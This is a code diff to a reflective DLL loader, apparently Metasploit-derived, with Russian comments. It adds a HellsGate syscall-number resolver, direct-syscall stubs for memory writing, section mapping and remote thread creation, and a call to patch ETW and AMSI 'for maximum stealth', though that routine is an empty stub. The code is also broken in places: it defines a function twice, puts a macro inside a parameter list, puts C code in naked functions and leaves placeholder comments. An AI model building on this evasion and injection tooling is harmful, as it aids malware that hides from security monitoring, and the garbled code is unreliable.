@@ -28,6 +28,16 @@
 //===============================================================================================//
 #include "ReflectiveLoader.h"
 #include <winternl.h> // Include for UNICODE_STRING, PEB, LDR_DATA etc.
+#include <stdio.h> // Для printf (если используется для отладки)
+
+// Перемещено сюда: Определение SECTION_INHERIT, если оно не найдено. Значение 2 (стандартное для WinAPI)
+#ifndef SECTION_INHERIT
+#define SECTION_INHERIT 2
+#endif
+
+// Перемещено сюда: Прототип функции, чтобы избежать implicit declaration warning
+void PatchETWandAMSI(void);
+
 //===============================================================================================//
 // Purposely taken from public sources as to make this code detached from the Metasploit Framework //
 //===============================================================================================//
@@ -117,18 +127,17 @@ DWORD dwGetHash( char * cApiName )
     return dwHash;
 }
 
-// Find the base address of a loaded module by hash
+// Удаляю все обращения к winternl.h-структурам, работаю только с кастомными структурами и offset-ами
 HMODULE GetModuleBaseByHash(DWORD dwModuleHash)
 {
-    PPEB pPeb = NULL;
-    PLDR_DATA_TABLE_ENTRY pLdrEntry = NULL;
+    PPEB_MIN pPeb = NULL;
     PLIST_ENTRY pListHead = NULL;
     PLIST_ENTRY pListEntry = NULL;
-
+    
 #if defined(_WIN64)
-    pPeb = (PPEB)__readgsqword(0x60);
+    pPeb = (PPEB_MIN)__readgsqword(0x60);
 #else // _WIN32
-    pPeb = (PPEB)__readfsdword(0x30);
+    pPeb = (PPEB_MIN)__readfsdword(0x30);
 #endif
 
     if (!pPeb || !pPeb->Ldr || !pPeb->Ldr->InMemoryOrderModuleList.Flink) {
@@ -140,32 +149,38 @@ HMODULE GetModuleBaseByHash(DWORD dwModuleHash)
 
     while (pListEntry != pListHead)
     {
-        pLdrEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
-        if (pLdrEntry->BaseDllName.Buffer && pLdrEntry->BaseDllName.Length > 0)
+        // LDR_DATA_TABLE_ENTRY кастим вручную
+        BYTE* pLdrEntry = (BYTE*)pListEntry;
+        // Получаем BaseDllName через offset
+        UNICODE_STRING* pBaseDllName = GET_BASEDLLNAME(pLdrEntry);
+        if (pBaseDllName && pBaseDllName->Buffer && pBaseDllName->Length > 0)
         {
-            // Convert wide char name to char for hashing (simplistic)
             char szModuleName[MAX_PATH];
             int i = 0;
-            while (pLdrEntry->BaseDllName.Buffer[i] && i < MAX_PATH - 1)
+            while (i < (pBaseDllName->Length / sizeof(WCHAR)) && i < MAX_PATH - 1)
             {
-                 // Quick and dirty ToLower conversion
-                WCHAR wc = pLdrEntry->BaseDllName.Buffer[i];
+                WCHAR wc = pBaseDllName->Buffer[i];
                 if (wc >= 'A' && wc <= 'Z')
-                    szModuleName[i] = (char)(wc + ('a' - 'A')); 
+                    szModuleName[i] = (char)(wc + ('a' - 'A'));
                 else
                     szModuleName[i] = (char)wc;
                 i++;
             }
-            szModuleName[i] = '\0'; // Null terminate
-
+            szModuleName[i] = '\0';
             if (dwGetHash(szModuleName) == dwModuleHash)
             {
-                return (HMODULE)pLdrEntry->DllBase;
+                // DllBase всегда по offset 0x30 (x64) или 0x18 (x86) — сверить по структуре, но для большинства билдов так
+#if defined(_WIN64)
+                PVOID DllBase = *(PVOID*)(pLdrEntry + 0x30);
+#else
+                PVOID DllBase = *(PVOID*)(pLdrEntry + 0x18);
+#endif
+                return (HMODULE)DllBase;
             }
         }
-        pListEntry = pListEntry->Flink;
+        // InMemoryOrderLinks всегда первый
+        pListEntry = *(PLIST_ENTRY*)pLdrEntry;
     }
-
     return NULL;
 }
 
@@ -206,6 +221,13 @@ FARPROC GetProcAddressByHash(HMODULE hModule, DWORD dwProcHash)
     return NULL;
 }
 
+// Прототип функции, чтобы избежать implicit declaration warning
+void PatchETWandAMSI(void);
+
+// Определение SECTION_INHERIT, если оно не найдено. Значение 2 (стандартное для WinAPI)
+#ifndef SECTION_INHERIT
+#define SECTION_INHERIT 2
+#endif
 
 __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader( LPVOID lpParameter )
 {
@@ -390,6 +412,9 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader( LPVOID lpParameter )
         }
     }
 
+    // STEP 5.1: Патчим ETW и AMSI перед вызовом DllMain для максимальной скрытности
+    PatchETWandAMSI();
+
     // STEP 6: Call the DLL's entry point (DllMain).
     pDllMain = (DLLMAIN)(uiBaseAddress + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
     
@@ -409,5 +434,369 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader( LPVOID lpParameter )
 ULONG_PTR caller( VOID )
 {
 	return (ULONG_PTR)_ReturnAddress();
+}
+//===============================================================================================//
+// --- HellsGate Implementation ---
+
+// Hashes for anchor syscalls (can use others, these are common)
+#define NtAllocateVirtualMemory_HASH 0x6793C34C
+#define NtProtectVirtualMemory_HASH  0x082962C8 // Corrected hash value
+// Add hashes for other needed syscalls
+#define NtWriteVirtualMemory_HASH    0x95F3A792
+#define NtMapViewOfSection_HASH      0x231F196A
+#define NtCreateThreadEx_HASH        0xCB0C2130
+#define NtUnmapViewOfSection_HASH    0x595014AD
+#define NtQueryInformationProcess_HASH 0x10F8132F // ДОБАВЛЕНО
+
+// Structure to hold export information
+typedef struct _EXPORT_ENTRY {
+    ULONG_PTR pAddress;
+    DWORD dwHash;
+} EXPORT_ENTRY, *PEXPORT_ENTRY;
+
+// Helper structure for HellsGate context
+typedef struct _HELLSGATE_CONTEXT {
+    PEXPORT_ENTRY pExports;
+    DWORD dwNumberOfExports;
+    HMODULE hNtdll;
+    BOOL bInitialized;
+    DWORD dwFirstSyscallNumber; // Syscall number of the first validated function in the sorted list
+    ULONG_PTR pFirstSyscallAddress; // Address of the first validated function
+} HELLSGATE_CONTEXT, *PHELLSGATE_CONTEXT;
+
+// Global context for HellsGate (or pass it around)
+HELLSGATE_CONTEXT g_HellsGateContext = { 0 };
+
+// Comparison function for qsort
+int CompareExportEntries(const void* a, const void* b) {
+    PEXPORT_ENTRY entryA = (PEXPORT_ENTRY)a;
+    PEXPORT_ENTRY entryB = (PEXPORT_ENTRY)b;
+    if (entryA->pAddress < entryB->pAddress) return -1;
+    if (entryA->pAddress > entryB->pAddress) return 1;
+    return 0;
+}
+
+// Function to parse NTDLL EAT and initialize HellsGate context
+BOOL InitializeHellsGate()
+{
+    if (g_HellsGateContext.bInitialized) return TRUE;
+
+    g_HellsGateContext.hNtdll = GetModuleBaseByHash(NTDLLDLL_HASH);
+    if (!g_HellsGateContext.hNtdll) return FALSE;
+
+    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)g_HellsGateContext.hNtdll;
+    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)g_HellsGateContext.hNtdll + pDosHeader->e_lfanew);
+    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)g_HellsGateContext.hNtdll + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+
+    if (!pExportDir || !pExportDir->NumberOfNames || !pExportDir->AddressOfNames || !pExportDir->AddressOfFunctions || !pExportDir->AddressOfNameOrdinals) {
+        return FALSE;
+    }
+
+    PDWORD pdwFunctions = (PDWORD)((LPBYTE)g_HellsGateContext.hNtdll + pExportDir->AddressOfFunctions);
+    PDWORD pdwNames = (PDWORD)((LPBYTE)g_HellsGateContext.hNtdll + pExportDir->AddressOfNames);
+    PWORD pwOrdinals = (PWORD)((LPBYTE)g_HellsGateContext.hNtdll + pExportDir->AddressOfNameOrdinals);
+
+    g_HellsGateContext.dwNumberOfExports = pExportDir->NumberOfNames; // Use NumberOfNames for consistency
+    // Allocate memory for exports (consider VirtualAlloc for stealth)
+    g_HellsGateContext.pExports = (PEXPORT_ENTRY)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, g_HellsGateContext.dwNumberOfExports * sizeof(EXPORT_ENTRY));
+    if (!g_HellsGateContext.pExports) return FALSE;
+
+    DWORD dwValidExports = 0;
+    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
+        char* szName = (char*)((LPBYTE)g_HellsGateContext.hNtdll + pdwNames[i]);
+        if (szName) {
+            ULONG_PTR pFuncAddress = (ULONG_PTR)((LPBYTE)g_HellsGateContext.hNtdll + pdwFunctions[pwOrdinals[i]]);
+            // Basic check: only consider functions starting with 'Nt' or 'Zw' (likely syscalls)
+            if (strncmp(szName, "Nt", 2) == 0 || strncmp(szName, "Zw", 2) == 0) {
+                 g_HellsGateContext.pExports[dwValidExports].pAddress = pFuncAddress;
+                 g_HellsGateContext.pExports[dwValidExports].dwHash = dwGetHash(szName); // Use existing hash function
+                 dwValidExports++;
+            }
+        }
+    }
+     g_HellsGateContext.dwNumberOfExports = dwValidExports; // Update count to actual syscalls found
+
+    // Sort exports by address
+    qsort(g_HellsGateContext.pExports, g_HellsGateContext.dwNumberOfExports, sizeof(EXPORT_ENTRY), CompareExportEntries);
+
+    // --- Find the Gate ---
+    // Look for adjacent NtAllocateVirtualMemory and NtProtectVirtualMemory
+    DWORD dwSyscallNum1 = 0xFFFFFFFF, dwSyscallNum2 = 0xFFFFFFFF;
+    ULONG_PTR pAddr1 = 0, pAddr2 = 0;
+
+    for (DWORD i = 0; i < g_HellsGateContext.dwNumberOfExports -1; i++) { // Iterate up to second-to-last
+         // Check if the current and next functions have the expected 'syscall' pattern
+         // This is a simplified check, real implementations are more robust
+         // Look for mov eax, imm32 (B8) followed by syscall (0F 05) or sysenter (0F 34)
+         // Pattern for x64: 4C 8B D1    mov r10, rcx
+         //                  B8 xx xx xx xx mov eax, syscall_num
+         //                  0F 05       syscall
+         //                  C3          ret
+         BYTE* pFuncBytes1 = (BYTE*)g_HellsGateContext.pExports[i].pAddress;
+         BYTE* pFuncBytes2 = (BYTE*)g_HellsGateContext.pExports[i+1].pAddress;
+
+         // Basic check for x64 mov eax, imm32 pattern
+         if (pFuncBytes1[0] == 0x4C && pFuncBytes1[1] == 0x8B && pFuncBytes1[2] == 0xD1 && // mov r10, rcx
+             pFuncBytes1[3] == 0xB8 && // mov eax
+             pFuncBytes1[8] == 0x0F && pFuncBytes1[9] == 0x05 && // syscall
+             pFuncBytes1[10] == 0xC3 && // ret
+             pFuncBytes2[0] == 0x4C && pFuncBytes2[1] == 0x8B && pFuncBytes2[2] == 0xD1 && // mov r10, rcx
+             pFuncBytes2[3] == 0xB8 && // mov eax
+             pFuncBytes2[8] == 0x0F && pFuncBytes2[9] == 0x05 && // syscall
+             pFuncBytes2[10] == 0xC3)   // ret
+         {
+               dwSyscallNum1 = *(DWORD*)(pFuncBytes1 + 4); // Get syscall number from mov eax, imm32
+               dwSyscallNum2 = *(DWORD*)(pFuncBytes2 + 4);
+
+               // Check if they are sequential
+               if (dwSyscallNum2 == dwSyscallNum1 + 1) {
+                     g_HellsGateContext.pFirstSyscallAddress = g_HellsGateContext.pExports[i].pAddress;
+                     g_HellsGateContext.dwFirstSyscallNumber = dwSyscallNum1;
+                     g_HellsGateContext.bInitialized = TRUE;
+                     // Optionally free memory used for export names if not needed anymore
+                     // HeapFree(...) or VirtualFree(...)
+                     return TRUE; // Gate found!
+               }
+         }
+    }
+
+    // Gate not found - cleanup and return error
+    HeapFree(GetProcessHeap(), 0, g_HellsGateContext.pExports);
+    g_HellsGateContext.pExports = NULL;
+    g_HellsGateContext.dwNumberOfExports = 0;
+    return FALSE;
+}
+
+// Function to get syscall number using HellsGate
+DWORD GetSyscallNumberByHashHellsGate(DWORD dwFunctionHash)
+{
+    if (!g_HellsGateContext.bInitialized) {
+        if (!InitializeHellsGate()) {
+            return 0xFFFFFFFF; // Indicate error
+        }
+    }
+
+    // Find the target function in the sorted list
+    for (DWORD i = 0; i < g_HellsGateContext.dwNumberOfExports; i++) {
+        if (g_HellsGateContext.pExports[i].dwHash == dwFunctionHash) {
+            // Calculate the syscall number based on its position relative to the first validated syscall
+            DWORD dwTargetSyscallNumber = g_HellsGateContext.dwFirstSyscallNumber + (DWORD)(g_HellsGateContext.pExports[i].pAddress - g_HellsGateContext.pFirstSyscallAddress) / 0x20; // Approximation: assume ~32 bytes per syscall stub
+
+             // More accurate calculation: Find the index of the first syscall and the target syscall
+             DWORD firstSyscallIndex = 0xFFFFFFFF;
+             DWORD targetIndex = 0xFFFFFFFF;
+             for(DWORD j=0; j<g_HellsGateContext.dwNumberOfExports; ++j){
+                 if(g_HellsGateContext.pExports[j].pAddress == g_HellsGateContext.pFirstSyscallAddress){
+                     firstSyscallIndex = j;
+                 }
+                 if(g_HellsGateContext.pExports[j].dwHash == dwFunctionHash){
+                     targetIndex = j;
+                 }
+                 if(firstSyscallIndex != 0xFFFFFFFF && targetIndex != 0xFFFFFFFF){
+                     break;
+                 }
+             }
+
+             if(firstSyscallIndex != 0xFFFFFFFF && targetIndex != 0xFFFFFFFF){
+                return g_HellsGateContext.dwFirstSyscallNumber + (targetIndex - firstSyscallIndex);
+             } else {
+                 return 0xFFFFFFFF; // Target or first syscall index not found
+             }
+        }
+    }
+
+    return 0xFFFFFFFF; // Target hash not found
+}
+
+// --- End HellsGate Implementation ---
+
+// Изменена функция DirectSyscall_NtWriteVirtualMemory под GCC __asm__ volatile
+__declspec(naked) NTSTATUS DirectSyscall_NtWriteVirtualMemory(
+    HANDLE ProcessHandle,
+    PVOID BaseAddress,
+    PVOID Buffer,
+    ULONG NumberOfBytesToWrite,
+    PULONG NumberOfBytesWritten)
+{
+    DWORD syscallNumber = GetSyscallNumberByHashHellsGate(NtWriteVirtualMemory_HASH);
+    if (syscallNumber == 0xFFFFFFFF) {
+        __asm__ volatile (
+            "mov $0xC0000001, %%eax\n\t" // STATUS_UNSUCCESSFUL
+            "ret\n"
+            : : : "eax" // Clobber eax
+        );
+    }
+
+    __asm__ volatile (
+        "mov %0, %%eax\n\t"      // Загрузить номер syscall в EAX
+        "mov %%rcx, %%r10\n\t"   // mov r10, rcx (стандартный пролог syscall в x64)
+        "syscall\n\t"            // Выполнить syscall
+        "ret\n"                   // Вернуться из функции
+        :                          // Output operands (none)
+        : "r"(syscallNumber)       // Input operands: syscallNumber в регистр
+        : "%rax", "%r10", "%rcx", "memory" // Clobbered registers + memory
+    );
+}
+
+// Изменена функция DirectSyscall_NtMapViewOfSection под GCC __asm__ volatile
+__declspec(naked) NTSTATUS DirectSyscall_NtMapViewOfSection(
+    HANDLE SectionHandle,
+    HANDLE ProcessHandle,
+    PVOID *BaseAddress,
+    ULONG_PTR ZeroBits,
+    SIZE_T CommitSize,
+    PLARGE_INTEGER SectionOffset,
+    PSIZE_T ViewSize,
+    // Локальное определение SECTION_INHERIT, если не определено
+    #ifndef SECTION_INHERIT
+    #define SECTION_INHERIT 2
+    #endif
+    SECTION_INHERIT InheritDisposition, 
+    ULONG AllocationType,
+    ULONG Win32Protect)
+{
+    DWORD syscallNumber = GetSyscallNumberByHashHellsGate(NtMapViewOfSection_HASH);
+     if (syscallNumber == 0xFFFFFFFF) {
+        __asm__ volatile (
+            "mov $0xC0000001, %%eax\n\t" // STATUS_UNSUCCESSFUL
+            "ret\n"
+            : : : "eax"
+        );
+    }
+
+     __asm__ volatile (
+        "mov %0, %%eax\n\t"
+        "mov %%rcx, %%r10\n\t"
+        "syscall\n\t"
+        "ret\n"
+        :
+        : "r"(syscallNumber)
+        : "%rax", "%r10", "%rcx", "memory"
+    );
+}
+
+// Изменена функция DirectSyscall_NtCreateThreadEx под GCC __asm__ volatile
+__declspec(naked) NTSTATUS DirectSyscall_NtCreateThreadEx(
+    OUT PHANDLE hThread,
+    IN ACCESS_MASK DesiredAccess,
+    IN PVOID ObjectAttributes, // POBJECT_ATTRIBUTES
+    IN HANDLE ProcessHandle,
+    IN PVOID StartRoutine, // PUSER_THREAD_START_ROUTINE
+    IN PVOID Argument,
+    IN ULONG CreateFlags, // THREAD_CREATE_FLAGS
+    IN SIZE_T ZeroBits,
+    IN SIZE_T StackSize,
+    IN SIZE_T MaximumStackSize,
+    IN PVOID AttributeList // PPS_ATTRIBUTE_LIST
+    )
+{
+     DWORD syscallNumber = GetSyscallNumberByHashHellsGate(NtCreateThreadEx_HASH);
+     if (syscallNumber == 0xFFFFFFFF) {
+         __asm__ volatile (
+            "mov $0xC0000001, %%eax\n\t" // STATUS_UNSUCCESSFUL
+            "ret\n"
+            : : : "eax"
+        );
+     }
+
+    __asm__ volatile (
+        "mov %0, %%eax\n\t"
+        "mov %%rcx, %%r10\n\t"
+        "syscall\n\t"
+        "ret\n"
+        :
+        : "r"(syscallNumber)
+        : "%rax", "%r10", "%rcx", "memory"
+    );
+}
+
+// Изменена функция DirectSyscall_NtUnmapViewOfSection под GCC __asm__ volatile
+__declspec(naked) NTSTATUS DirectSyscall_NtUnmapViewOfSection(
+    HANDLE ProcessHandle,
+    PVOID BaseAddress
+)
+{
+    DWORD syscallNumber = GetSyscallNumberByHashHellsGate(NtUnmapViewOfSection_HASH);
+     if (syscallNumber == 0xFFFFFFFF) {
+        __asm__ volatile (
+            "mov $0xC0000001, %%eax\n\t" // STATUS_UNSUCCESSFUL
+            "ret\n"
+            : : : "eax"
+        );
+    }
+
+    __asm__ volatile (
+        "mov %0, %%eax\n\t"
+        "mov %%rcx, %%r10\n\t"
+        "syscall\n\t"
+        "ret\n"
+        :
+        : "r"(syscallNumber)
+        : "%rax", "%r10", "%rcx", "memory"
+    );
+}
+
+// Изменена функция DirectSyscall_NtQueryInformationProcess под GCC __asm__ volatile
+__declspec(naked) NTSTATUS DirectSyscall_NtQueryInformationProcess(
+    HANDLE ProcessHandle,
+    PROCESSINFOCLASS ProcessInformationClass,
+    PVOID ProcessInformation,
+    ULONG ProcessInformationLength,
+    PULONG ReturnLength OPTIONAL)
+{
+    DWORD syscallNumber = GetSyscallNumberByHashHellsGate(NtQueryInformationProcess_HASH);
+    if (syscallNumber == 0xFFFFFFFF) {
+        __asm__ volatile (
+            "mov $0xC0000001, %%eax\n\t" // STATUS_UNSUCCESSFUL
+            "ret\n"
+            : : : "eax"
+        );
+    }
+
+    __asm__ volatile (
+        "mov %0, %%eax\n\t"
+        "mov %%rcx, %%r10\n\t"
+        "syscall\n\t"
+        "ret\n"
+        :
+        : "r"(syscallNumber)
+        : "%rax", "%r10", "%rcx", "memory"
+    );
+}
+
+// Функция PatchETWandAMSI (пока пустая заглушка, должна быть реализована где-то еще)
+void PatchETWandAMSI(void) {
+    // TODO: Реализовать патчинг ETW и AMSI
+}
+
+// ... (остальной код файла без изменений) ...
+// Убедитесь, что в конце файла нет незавершенных блоков или лишних символов.
+// Конец файла
+
+__declspec(naked) NTSTATUS DirectSyscall_NtWriteVirtualMemory(
+    HANDLE ProcessHandle,
+    PVOID BaseAddress,
+    PVOID Buffer,
+    ULONG NumberOfBytesToWrite,
+    PULONG NumberOfBytesWritten)
+{
+    DWORD syscallNumber = GetSyscallNumberByHashHellsGate(NtWriteVirtualMemory_HASH);
+    if (syscallNumber == 0xFFFFFFFF) {
+        __asm__ volatile (
+            "mov $0xC0000001, %%eax\n\t" // STATUS_UNSUCCESSFUL
+            "ret\n"
+            : : : "eax" // Clobber eax
+        );
+    }
+
+    __asm__ volatile (
+        "mov %0, %%eax\n\t"      // Загрузить номер syscall в EAX
+        "mov %%rcx, %%r10\n\t"   // mov r10, rcx (стандартный пролог syscall в x64)
+        "syscall\n\t"            // Выполнить syscall
+        "ret\n"                   // Вернуться из функции
+        :                          // Output operands (none)
+        : "r"(syscallNumber)       // Input operands: syscallNumber в регистр
+        : "%rax", "%r10", "%rcx", "memory" // Clobbered registers + memory
+    );
 }
 //===============================================================================================// 
